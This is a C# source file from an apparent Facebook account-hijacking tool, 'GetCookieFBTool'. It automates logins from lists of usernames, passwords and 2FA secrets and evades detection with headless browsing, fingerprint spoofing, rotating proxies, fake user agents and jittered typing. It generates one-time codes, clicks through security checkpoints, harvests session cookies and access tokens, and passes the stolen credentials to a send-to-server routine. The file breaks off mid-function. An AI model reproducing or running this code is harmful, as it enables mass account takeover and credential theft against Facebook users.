using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;
using GetCookieFBTool.HelperLibrary.Facebook;
using GetCookieFBTool.HelperLibrary.HelperProxy;
using Newtonsoft.Json.Linq;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Chrome.ChromeDriverExtensions;
using OtpNet;
using RestSharp;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using xNet;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Net;
using System.Security.Principal;
using static System.Net.WebRequestMethods;
using OpenQA.Selenium.DevTools;
using OpenQA.Selenium.Interactions;
using System.Diagnostics;
using System.Security.Policy;

namespace GetCookieFBTool.HelperLibrary.Facebook
{
    internal class Core
    {

        public static void InitModeHide(Account account)
        {
            var options = new ChromeOptions();
            options.AddArgument("--window-position=-32000,-32000");
            options.AddArgument("--headless");
            options.AddArgument("ignore-certificate-errors");

            Init(account, options);
        }

        public static void InitModeShowAll(Account account)
        {
            var options = new ChromeOptions();
            if (FacebookInstances.urlType == 5)
                options.AddArgument("--window-size=1200,800");
            else
                options.AddArgument("--window-size=400,800");
            //options.AddArgument("--headless");
            options.AddArgument("ignore-certificate-errors");
            Init(account, options);
        }

        public static void InitModeShowTaskbar(Account account)
        {
            var options = new ChromeOptions();
            options.AddArgument("--window-position=-32000,-32000");
            //options.AddArgument("--headless");
            options.AddArgument("ignore-certificate-errors");
            Init(account, options);
        }

        public static void Init(Account account, ChromeOptions options)
        {
            while (true)
            {
                if (FacebookInstances.waitChangeIP)
                {
                    Thread.Sleep(1000);
                }
                else
                {
                    break;
                }
            }

            string mainUrl = "";
            Random random = new Random();
            int urlType = FacebookInstances.urlType;


            //if (urlType == 3)
            //{
            //    var request = new Request();
            //    var checklogin = Login.LoginMethodMBasic_XNET(request, account.userName, account.pass, account.key2fa);
            //    if (checklogin)
            //    {

            //        return;
            //    }
            //}
            //else if (urlType == 4)
            //{
            //    var request = new Request();
            //    var checklogin = Login.LoginMethodMFB_XNET(request, account.userName, account.pass, account.key2fa);
            //    if (checklogin)
            //    {

            //        return;
            //    }
            //}


            //var request = new Request();
            //var checklogin = Login.LoginMethodMFB_XNET(request, account.userName, account.pass, account.key2fa);
            //var tokenEAAG = "";
            //if (checklogin)
            //{
            //    tokenEAAG = Login.getTokenRequest(request, account.userName, account.key2fa);
            //}

            //return;





            // remove bar
            options.AddExcludedArgument("enable-automation");
            //options.AddAdditionalCapability("useAutomationExtension", false);
            options.AddArgument("--disable-web-security");
            options.AddArgument("--disable-blink-features=AutomationControlled");
            options.AddArgument("--no-sandbox");
            options.AddArgument("--start-maximized");
            options.AddUserProfilePreference("credentials_enable_service", false);
            options.AddUserProfilePreference("profile.password_manager_enabled", false);

            //userAgent
            string userAgent = null;
            string new_proxy = "";
            if (FacebookInstances.fakeUserAgent)
            {
                int a = random.Next(0, FacebookInstances.lsFakeUserAgent.Count);
                //FacebookInstances.queueFakeUserAgent.TryDequeue(out userAgent);
                userAgent = FacebookInstances.lsFakeUserAgent[a];
                if (userAgent != null)
                {

                    options.AddArgument("--user-agent=" + userAgent);
                    //FacebookInstances.queueFakeUserAgent.Enqueue(userAgent);
                }
                else
                {
                    userAgent = "";
                }
            }
            if (userAgent != "" && userAgent != null)
            {
                if (FacebookInstances.timeUa)
                {
                    var a = random.Next(0, 10);
                    var b = random.Next(1000, 10000);
                    var c = random.Next(10, 100);
                    var rdVersion = a + "." + b + "." + c;
                    userAgent = userAgent + rdVersion;
                    //userAgent = userAgent + " " + DateTime.Now.AddDays(-a).AddHours(-a).ToString("dd/MM/yyyy HH':'mm':'ss");
                }
                else if (FacebookInstances.timeRealUa)
                {
                    userAgent = userAgent + " " + DateTime.Now.ToString("dd/MM/yyyy HH':'mm':'ss");
                }
            }

            ChromeDriver driver = null;

            try
            {
                options.AddUserProfilePreference("profile.default_content_setting_values.images", 2);
                if (FacebookInstances.addEx)
                    options.AddExtensions(AppDomain.CurrentDomain.BaseDirectory + "\\Fingerprint-Spoofing.crx");

                FacebookInstances.numRan += 1;
                //var delayTime = FacebookInstances.delayLevel * 100;

                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.HideCommandPromptWindow = true;

                if (ProxyInstances.userProxy == true)
                {
                    while (ProxyInstances.Http.Count == 0)
                    {
                        Thread.Sleep(5 * 1000);
                    }
                    if (!ProxyInstances.Http.TryDequeue(out new_proxy) || new_proxy == null)
                    {
                        throw new Exception("proxy empty!");
                    }
                    else
                    {
                        long currentTime = (long)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalMilliseconds;
                        if (ProxyInstances.type == 0 || ProxyInstances.type == 1
                            || ProxyInstances.type == 4 || ProxyInstances.type == 5
                            || ProxyInstances.type == 7 || ProxyInstances.type == 8 || ProxyInstances.type == 9
                            || ProxyInstances.type == 10 || ProxyInstances.type == 11 || ProxyInstances.type == 12
                            || ProxyInstances.type == 13 || ProxyInstances.type == 14)
                        {
                            if (currentTime - ProxyInstances.beginTime <= ProxyInstances.timeUpdate)
                            {
                                ProxyInstances.Http.Enqueue(new_proxy);
                            }
                        }
                        else
                            ProxyInstances.Http.Enqueue(new_proxy);

                        if (new_proxy.Split(':').Length <= 2)
                        {
                            //if(ProxyInstances.type == 3)
                            //{
                            //    options.AddArgument($"--proxy-server={new_proxy}");
                            //}
                            /*else*/
                            if (ProxyInstances.type != 10 && ProxyInstances.type != 14)
                            {
                                var proxy = new Proxy();
                                proxy.Kind = ProxyKind.Manual;
                                proxy.IsAutoDetect = false;
                                proxy.HttpProxy = new_proxy;
                                proxy.SslProxy = new_proxy;
                                proxy.SocksUserName = "";
                                proxy.SocksPassword = "";
                                options.Proxy = proxy;
                            }
                            else
                            {
                                options.AddArgument("--proxy-server=socks5://" + new_proxy);
                            }

                            driver = new ChromeDriver(service, options);
                        }
                        else
                        {
                            var eleProxy = new_proxy.Split(':');
                            options.AddHttpProxy(eleProxy[0], Int32.Parse(eleProxy[1]), eleProxy[2], eleProxy[3]);
                            driver = new ChromeDriver(service, options);
                        }
                    }
                }
                else
                {
                    driver = new ChromeDriver(service, options);
                }

                //IWebDriver driver = new ChromeDriver(options);
                driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(FacebookInstances.pageLoadTime);

                Thread.Sleep(FacebookInstances.delayLevel);
                for (var i = 0; i < FacebookInstances.lsLinkFix.Count; i++)
                {
                    if (FacebookInstances.lsLinkFix[i] != null && FacebookInstances.lsLinkFix[i] != "")
                    {
                        driver.Navigate().GoToUrl(FacebookInstances.lsLinkFix[i]);
                        Thread.Sleep(2000);
                    }
                }


                //if (FacebookInstances.CookieSP)
                //{
                //    driver.Navigate().GoToUrl(@"https://www.facebook.com/");
                //    driver.Manage().Cookies.DeleteAllCookies();
                //    string stringCookie;
                //    FacebookInstances.cookiePrepare.TryDequeue(out stringCookie);
                //    var cookies = stringCookie.Split(';');
                //    foreach (string cookie in cookies)
                //    {
                //        if (cookie == "") break;
                //        var datacookie = cookie.Trim().Split('=');
                //        Cookie name = new Cookie(datacookie[0], datacookie[1]);
                //        driver.Manage().Cookies.AddCookie(name);
                //    }
                //    FacebookInstances.cookiePrepare.Enqueue(stringCookie);
                //}
                //if (FacebookInstances.urlType ==1)
                //{
                //    driver.Navigate().GoToUrl("https://www.facebook.com/login.php");
                //}
                //else if(FacebookInstances.urlType == 2)
                //{
                //    driver.Navigate().GoToUrl("https://www.fb.com/");
                //}



                if (urlType != 3 && urlType != 4 && urlType != 5)
                {
                    if (FacebookInstances.urlCustom == "" || FacebookInstances.urlCustom == null)
                    {
                        if (urlType == 1)
                        {
                            mainUrl = "https://www.fb.com/";
                        }
                        else if (urlType == 2)
                        {
                            mainUrl = "https://www.fb.com/login";
                        }
                        else if (urlType == 0)
                        {
                            int indexUrl = random.Next(0, FacebookInstances.lsUrlCustom.Count());
                            mainUrl = FacebookInstances.lsUrlCustom[indexUrl];
                        }
                    }
                    else
                    {
                        mainUrl = FacebookInstances.urlCustom;
                    }
                    if (FacebookInstances.CookieSP)
                    {
                        driver.Navigate().GoToUrl(mainUrl);
                        driver.Manage().Cookies.DeleteAllCookies();
                        string stringCookie;
                        FacebookInstances.cookiePrepare.TryDequeue(out stringCookie);
                        var cookies = stringCookie.Split(';');
                        foreach (string cookie in cookies)
                        {
                            if (cookie == "") break;
                            var datacookie = cookie.Trim().Split('=');
                            if (datacookie.Length > 1)
                            {
                                OpenQA.Selenium.Cookie name = new OpenQA.Selenium.Cookie(datacookie[0], datacookie[1]);
                                driver.Manage().Cookies.AddCookie(name);
                            }

                        }
                        FacebookInstances.cookiePrepare.Enqueue(stringCookie);
                        driver.Navigate().GoToUrl(mainUrl);
                    }


                    if (FacebookInstances.AccSP)
                    {
                        driver.Navigate().GoToUrl(mainUrl);
                        //driver.Manage().Cookies.DeleteAllCookies();
                        string accPre;
                        FacebookInstances.queueAccPre.TryDequeue(out accPre);
                        var eleAccs = accPre.Split('|');
                        var userInput1 = driver.FindElement(By.Id("email"));
                        var passInput1 = driver.FindElement(By.Id("pass"));
                        var loginBtn1 = driver.FindElement(By.Name("login"));
                        userInput1.SendKeys(eleAccs[0]);
                        passInput1.SendKeys(eleAccs[1]);
                        Thread.Sleep(1 * 1000);
                        loginBtn1.Click();
                        Thread.Sleep(2 * 1000);
                        var lsCookies1 = getCookie(driver);
                        string cookies = "";
                        foreach (var cookie in lsCookies1)
                        {
                            cookies += cookie.ToString().Split(';')[0] + ";";
                        }
                        var preAccData = (eleAccs[0] + "|" + eleAccs[1] + "|" + cookies).Replace("\r", "").Replace("\n", "");
                        FacebookInstances.dataCookiePre.Enqueue(preAccData);
                        sendResultToServer(preAccData, "accpre");
                        //FacebookInstances.queueAccPre.Enqueue(accPre);
                    }

                    driver.Navigate().GoToUrl(mainUrl);

                    Thread.Sleep(2 * 1000);
                    try
                    {
                        var textSpam = driver.FindElement(By.XPath("//h2[@class='accessible_elem']")).Text;
                        if (textSpam.Contains("Blocked"))
                        {
                            FacebookInstances.OnNewAccAdded(account, "spam" + " - URL: " + mainUrl, null, null, userAgent);
                            driver.Close();
                            driver.Quit();
                            return;
                        }
                    }
                    catch { }



                    var userInput = driver.FindElement(By.Id("email"));
                    var passInput = driver.FindElement(By.Id("pass"));
                    var loginBtn = driver.FindElement(By.Name("login"));

                    //userInput.SendKeys(account.userName);
                    ////Thread.Sleep(3 * 1000);
                    //passInput.SendKeys(account.pass);

                    Random r = new Random();
                    foreach (char s in account.userName)
                    {
                        userInput.SendKeys(s.ToString());
                        Thread.Sleep((int)(r.Next(1, 3) * 5));
                    }
                    Thread.Sleep(1 * 1000);
                    foreach (char s in account.pass)
                    {
                        passInput.SendKeys(s.ToString());
                        Thread.Sleep((int)(r.Next(1, 3) * 5));
                    }

                    Thread.Sleep(1 * 1000);
                    loginBtn.Click();
                    Thread.Sleep(2 * 1000);
                    if (driver.Url.Contains("/login/?") || driver.Url.Contains("/login/identify/?"))
                    {
                        // accessible_elem
                        FacebookInstances.OnNewAccAdded(account, "error" + " - URL: " + mainUrl, null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }

                    int checkpointCount = 0;


                    if (driver.Url.Contains("facebook.com/checkpoint/?next"))
                    {
                        if (account.key2fa != null)
                        {
                            var ele2faInput = driver.FindElement(By.Id("approvals_code"));//approvals_code
                            var secretKey = Base32Encoding.ToBytes(account.key2fa);
                            var totp = new Totp(secretKey);
                            var otp = totp.ComputeTotp();
                            ele2faInput.SendKeys(otp);
                            Thread.Sleep(1 * 1000);
                            var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));//checkpointSubmitButton
                            continueBtn.Submit();
                            Thread.Sleep(1 * 1000);


                            while (driver.Url.Contains("facebook.com/checkpoint/?next"))
                            {
                                checkpointCount++;
                                try
                                {
                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
                                    if (notSaveBrowser != null)
                                    {
                                        notSaveBrowser.Click();
                                        Thread.Sleep(1 * 1000);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                }
                                finally
                                {
                                    continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));
                                    continueBtn.Submit();
                                    Thread.Sleep(1 * 1000);
                                }
                                if (checkpointCount > 5)
                                {
                                    break;
                                }
                            }

                        }
                        else
                        {
                            while (driver.Url.Contains("facebook.com/checkpoint/?next"))
                            {
                                checkpointCount++;
                                try
                                {
                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
                                    if (notSaveBrowser != null)
                                    {
                                        notSaveBrowser.Click();
                                        Thread.Sleep(1 * 1000);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                }
                                finally
                                {
                                    var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));
                                    continueBtn.Submit();
                                    Thread.Sleep(1 * 1000);
                                }
                                if (checkpointCount > 5)
                                {
                                    break;
                                }
                            }
                        }
                    }

                    var lsCookies = getCookie(driver);
                    userAgent = getUserAgent(driver);

                    var accessToken = "";
                    if (FacebookInstances.getToken)
                        accessToken = getToken(driver, account.key2fa);

                    if (lsCookies == null && userAgent == null)
                    {
                        FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }
                    //else if(accessToken != null)
                    //{
                    //    string cookies = "";
                    //    foreach (var cookie in lsCookies)
                    //    {
                    //        cookies += cookie.ToString();
                    //    }
                    //    FacebookInstances.OnNewAccAdded(account, "success", cookies, accessToken, userAgent);
                    //    var data = account.userName + "|" + account.pass + "|" + cookies + "|" + userAgent + "|" + accessToken;

                    //    sendResultToServer(data, "success");
                    //}
                    else if (driver.Url.Contains("checkpoint"))
                    {
                        if (FacebookInstances.checkLocate)
                        {
                            try
                            {
                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
                                Thread.Sleep(2 * 1000);
                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
                            }
                            catch { }
                        }
                        string cookies = "";
                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }

                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                            + "|" + userAgent + "|" + "checkpoint" + " - URL: " + mainUrl + "|" +
                            DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "checkpoint" + " - URL: " + mainUrl, cookies, "", userAgent);
                        sendResultToServer(data, "checkpoint");
                    }
                    else if (driver.Url.Contains("confirmemail.php?") || driver.Url.Contains("confirmation"))
                    {
                        if (FacebookInstances.checkLocate)
                        {
                            try
                            {
                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
                                Thread.Sleep(2 * 1000);
                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
                            }
                            catch { }
                        }
                        string cookies = "";
                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }

                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                             + "|" + userAgent + "|" + "no-veri" + " - URL: " + mainUrl + "|" +
                             DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|no-veri";
                        FacebookInstances.OnNewAccAdded(account, "no-veri" + " - URL: " + mainUrl, cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }
                    else
                    {
                        if (FacebookInstances.checkLocate)
                        {
                            try
                            {
                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
                                Thread.Sleep(2 * 1000);
                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
                            }
                            catch { }
                        }

                        string cookies = "";

                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }
                        }
                        if (!cookies.Contains("c_user"))
                        {
                            FacebookInstances.OnNewAccAdded(account, "lostCookies" + " - URL: " + mainUrl, null, null, userAgent);
                            driver.Close();
                            driver.Quit();
                            return;
                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                             + "|" + userAgent + "|" + "success" + " - URL: " + mainUrl + "|" +
                             DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "|verify";
                        FacebookInstances.OnNewAccAdded(account, "success" + " - URL: " + mainUrl, cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }

                    driver.Close();
                    driver.Quit();
                }
                else if (urlType == 3 || urlType == 4)
                {
                    if (urlType == 3)
                        mainUrl = "https://mbasic.facebook.com/";

                    else if (urlType == 4)
                        mainUrl = "https://mobile.facebook.com/";
                    driver.Navigate().GoToUrl(mainUrl);

                    Thread.Sleep(1000);
                    var userInput = driver.FindElement(By.Id("m_login_email"));
                    var passInput = driver.FindElement(By.Name("pass"));
                    var loginBtn = driver.FindElement(By.Name("login"));

                    //userInput.SendKeys(account.userName);
                    //passInput.SendKeys(account.pass);

                    Random r = new Random();
                    foreach (char s in account.userName)
                    {
                        userInput.SendKeys(s.ToString());
                        Thread.Sleep((int)(r.Next(1, 3) * 5));
                    }
                    Thread.Sleep(1 * 1000);
                    foreach (char s in account.pass)
                    {
                        passInput.SendKeys(s.ToString());
                        Thread.Sleep((int)(r.Next(1, 3) * 5));
                    }



                    Thread.Sleep(1 * 1000);
                    loginBtn.Click();
                    Thread.Sleep(2 * 1000);

                    int checkpointCount = 0;

                    if (driver.Url.Contains("rdr"))
                    {
                        if (account.key2fa != null)
                        {
                            var ele2faInput = driver.FindElement(By.Id("approvals_code"));//approvals_code
                            var secretKey = Base32Encoding.ToBytes(account.key2fa);
                            var totp = new Totp(secretKey);
                            var otp = totp.ComputeTotp();
                            ele2faInput.SendKeys(otp);
                            Thread.Sleep(1 * 1000);
                            var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton-actual-button"));//checkpointSubmitButton
                            continueBtn.Submit();
                            Thread.Sleep(1 * 1000);


                            while (driver.Url.Contains("facebook.com/login/checkpoint/"))
                            {
                                checkpointCount++;
                                try
                                {
                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
                                    if (notSaveBrowser != null)
                                    {
                                        notSaveBrowser.Click();
                                        Thread.Sleep(1 * 1000);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                }
                                finally
                                {
                                    try
                                    {
                                        continueBtn = driver.FindElement(By.Id("checkpointSubmitButton-actual-button"));
                                        continueBtn.Submit();
                                        Thread.Sleep(1 * 1000);
                                    }
                                    catch { }
                                }
                                if (checkpointCount > 5)
                                {
                                    break;
                                }
                            }

                        }
                        else
                        {
                            while (driver.Url.Contains("facebook.com/login/"))
                            {
                                checkpointCount++;
                                try
                                {
                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
                                    if (notSaveBrowser != null)
                                    {
                                        notSaveBrowser.Click();
                                        Thread.Sleep(1 * 1000);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                }
                                finally
                                {
                                    try
                                    {
                                        var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton-actual-button"));
                                        continueBtn.Submit();
                                        Thread.Sleep(1 * 1000);
                                    }
                                    catch { }
                                }
                                if (checkpointCount > 5)
                                {
                                    break;
                                }
                            }
                        }
                    }


                    if (driver.Url.Contains("/login/?") || !driver.Url.Contains(".com/"))
                    {
                        // accessible_elem
                        FacebookInstances.OnNewAccAdded(account, "error" + " - URL: " + mainUrl, null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }


                    var lsCookies = getCookie(driver);
                    userAgent = getUserAgent(driver);

                    var accessToken = "";
                    if (FacebookInstances.getToken)
                        accessToken = getToken(driver, account.key2fa);

                    if (lsCookies == null && userAgent == null)
                    {
                        FacebookInstances.OnNewAccAdded(account, "error" + " - URL: " + mainUrl, null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }
                    else if (driver.Url.Contains("checkpoint"))
                    {
                        if (FacebookInstances.checkLocate)
                        {
                            try
                            {
                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
                                Thread.Sleep(2 * 1000);
                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
                            }
                            catch { }
                        }
                        string cookies = "";
                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }

                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                             + "|" + userAgent + "|" + "checkpoint" + " - URL: " + mainUrl + "|" +
                             DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "checkpoint" + " - URL: " + mainUrl, cookies, "", userAgent);
                        sendResultToServer(data, "checkpoint");
                    }
                    else
                    {
                        if (FacebookInstances.checkLocate)
                        {
                            try
                            {
                                driver.Navigate().GoToUrl("https://mbasic.facebook.com/primary_location/info");
                                Thread.Sleep(2 * 1000);
                                account.locateNew = driver.FindElements(By.TagName("h3"))[1].Text;
                            }
                            catch { }
                        }
                        string cookies = "";

                        foreach (var cookie in lsCookies)
                        {
                            if (cookie.Name == "c_user" || cookie.Name == "xs" || cookie.Name == "wd" ||
                                cookie.Name == "datr" || cookie.Name == "sb" || cookie.Name == "fr" ||
                                cookie.Name == "presence" || cookie.Name == "m_page_voice" || cookie.Name == "referer" ||
                                cookie.Name == "xs" || cookie.Name == "wd" || cookie.Name == "m_pixel_ratio" ||
                                cookie.Name == "locale" || cookie.Name == "datr")
                            {
                                cookies += cookie.ToString().Split(';')[0] + ";";
                            }
                        }
                        if (!cookies.Contains("c_user"))
                        {
                            FacebookInstances.OnNewAccAdded(account, "lostCookies" + " - URL: " + mainUrl, null, null, userAgent);
                            driver.Close();
                            driver.Quit();
                            return;
                        }
                        var data = account.userName + "|" + account.pass + "|" + cookies + "|" + accessToken + "|" + account.key2fa
                            + "|" + account.locate + "|" + account.locateNew
                             + "|" + userAgent + "|" + "success" + " - URL: " + mainUrl + "|" +
                             DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                        FacebookInstances.OnNewAccAdded(account, "success" + " - URL: " + mainUrl, cookies, "", userAgent);
                        sendResultToServer(data, "success");
                    }

                    driver.Close();
                    driver.Quit();

                }
                else if (urlType == 5)
                {

                    mainUrl = "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&wtsid=rdr_0PaPe7yLHq3r3J0K4";
                    //if (FacebookInstances.CookieSP)
                    //{
                    //    driver.Navigate().GoToUrl(mainUrl);
                    //    driver.Manage().Cookies.DeleteAllCookies();
                    //    string stringCookie;
                    //    FacebookInstances.cookiePrepare.TryDequeue(out stringCookie);
                    //    var cookies = stringCookie.Split(';');
                    //    foreach (string cookie in cookies)
                    //    {
                    //        if (cookie == "") break;
                    //        var datacookie = cookie.Trim().Split('=');
                    //        if (datacookie.Length > 1)
                    //        {
                    //            OpenQA.Selenium.Cookie name = new OpenQA.Selenium.Cookie(datacookie[0], datacookie[1]);
                    //            driver.Manage().Cookies.AddCookie(name);
                    //        }

                    //    }
                    //    FacebookInstances.cookiePrepare.Enqueue(stringCookie);
                    //    driver.Navigate().GoToUrl(mainUrl);

                    //}


                    //if (FacebookInstances.AccSP)
                    //{
                    //    driver.Navigate().GoToUrl(mainUrl);
                    //    //driver.Manage().Cookies.DeleteAllCookies();
                    //    string accPre;
                    //    FacebookInstances.queueAccPre.TryDequeue(out accPre);
                    //    var eleAccs = accPre.Split('|');
                    //    var userInput1 = driver.FindElement(By.Id("email"));
                    //    var passInput1 = driver.FindElement(By.Id("pass"));
                    //    var loginBtn1 = driver.FindElement(By.Name("login"));
                    //    userInput1.SendKeys(eleAccs[0]);
                    //    passInput1.SendKeys(eleAccs[1]);
                    //    Thread.Sleep(1 * 1000);
                    //    loginBtn1.Click();
                    //    Thread.Sleep(2 * 1000);
                    //    var lsCookies1 = getCookie(driver);
                    //    string cookies = "";
                    //    foreach (var cookie in lsCookies1)
                    //    {
                    //        cookies += cookie.ToString().Split(';')[0] + ";";
                    //    }
                    //    FacebookInstances.dataCookiePre.Enqueue(cookies);
                    //    //FacebookInstances.queueAccPre.Enqueue(accPre);
                    //}

                    driver.Navigate().GoToUrl(mainUrl);
                    Thread.Sleep(2 * 1000);
                    driver.Navigate().Refresh();
                    Thread.Sleep(2000);
                    //((IJavaScriptExecutor)driver).ExecuteScript("document.body.style.zoom='40%'");


                    try
                    {
                        var textSpam = driver.FindElement(By.XPath("//h2[@class='accessible_elem']")).Text;
                        if (textSpam.Contains("Blocked"))
                        {
                            FacebookInstances.OnNewAccAdded(account, "spam", null, null, userAgent);
                            driver.Close();
                            driver.Quit();
                            return;
                        }
                    }
                    catch { }



                    var userInput = driver.FindElements(By.Name("email"))[0];
                    var passInput = driver.FindElement(By.Name("pass"));

                    var loginBtn = driver.FindElement(By.XPath("//div[@aria-label='Accessible login button']"));

                    //var loginBtn = driver.FindElement(By.Name("login"));

                    //userInput.SendKeys(account.userName);
                    ////Thread.Sleep(3 * 1000);
                    //passInput.SendKeys(account.pass);

                    Random r = new Random();
                    foreach (char s in account.userName)
                    {
                        userInput.SendKeys(s.ToString());
                        Thread.Sleep((int)(r.Next(1, 3) * 5));
                    }
                    Thread.Sleep(1 * 1000);
                    foreach (char s in account.pass)
                    {
                        passInput.SendKeys(s.ToString());
                        Thread.Sleep((int)(r.Next(1, 3) * 5));
                    }

                    Thread.Sleep(1 * 1000);
                    loginBtn.Click();
                    Thread.Sleep(2 * 1000);
                    if (driver.Url.Contains("/login/?") || driver.Url.Contains("/login/identify/?"))
                    {
                        // accessible_elem
                        FacebookInstances.OnNewAccAdded(account, "error", null, null, userAgent);
                        driver.Close();
                        driver.Quit();
                        return;
                    }

                    int checkpointCount = 0;


                    if (driver.Url.Contains("facebook.com/checkpoint/?next"))
                    {
                        if (account.key2fa != null)
                        {
                            var ele2faInput = driver.FindElement(By.Id("approvals_code"));//approvals_code
                            var secretKey = Base32Encoding.ToBytes(account.key2fa);
                            var totp = new Totp(secretKey);
                            var otp = totp.ComputeTotp();
                            ele2faInput.SendKeys(otp);
                            Thread.Sleep(1 * 1000);
                            var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));//checkpointSubmitButton
                            continueBtn.Submit();
                            Thread.Sleep(1 * 1000);


                            while (driver.Url.Contains("facebook.com/checkpoint/?next"))
                            {
                                checkpointCount++;
                                try
                                {
                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
                                    if (notSaveBrowser != null)
                                    {
                                        notSaveBrowser.Click();
                                        Thread.Sleep(1 * 1000);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                }
                                finally
                                {
                                    continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));
                                    continueBtn.Submit();
                                    Thread.Sleep(1 * 1000);
                                }
                                if (checkpointCount > 5)
                                {
                                    break;
                                }
                            }

                        }
                        else
                        {
                            while (driver.Url.Contains("facebook.com/checkpoint/?next"))
                            {
                                checkpointCount++;
                                try
                                {
                                    var notSaveBrowser = driver.FindElement(By.XPath("//*[@value='dont_save']"));
                                    if (notSaveBrowser != null)
                                    {
                                        notSaveBrowser.Click();
                                        Thread.Sleep(1 * 1000);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine(e.Message);
                                }
                                finally
                                {
                                    var continueBtn = driver.FindElement(By.Id("checkpointSubmitButton"));
                                    continueBtn.Submit();
                                    Thread.Sleep(1 * 1000);
                                }
                                if (checkpointCount > 5)
                                {
                                    break;
                                }
                            }
                        }
                    }

                    var lsCookies = getCookie(driver);
                    userAgent = getUserAgent(driver);

                    var accessToken = "";
